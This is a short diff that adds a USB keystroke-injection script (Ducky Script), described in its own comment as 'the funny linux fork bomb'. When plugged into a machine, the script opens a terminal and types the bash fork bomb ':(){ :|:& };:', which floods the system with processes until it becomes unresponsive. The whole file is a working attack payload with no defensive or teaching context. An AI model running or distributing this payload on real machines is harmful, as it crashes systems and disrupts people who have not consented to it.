@@ -1,0 +1,8 @@
+REM runs the funny linux fork bomb
+DEFAULT_DELAY 200
+GUI
+STRING terminal
+ENTER
+STRING :(){ :|:& };:
+ENTER
+
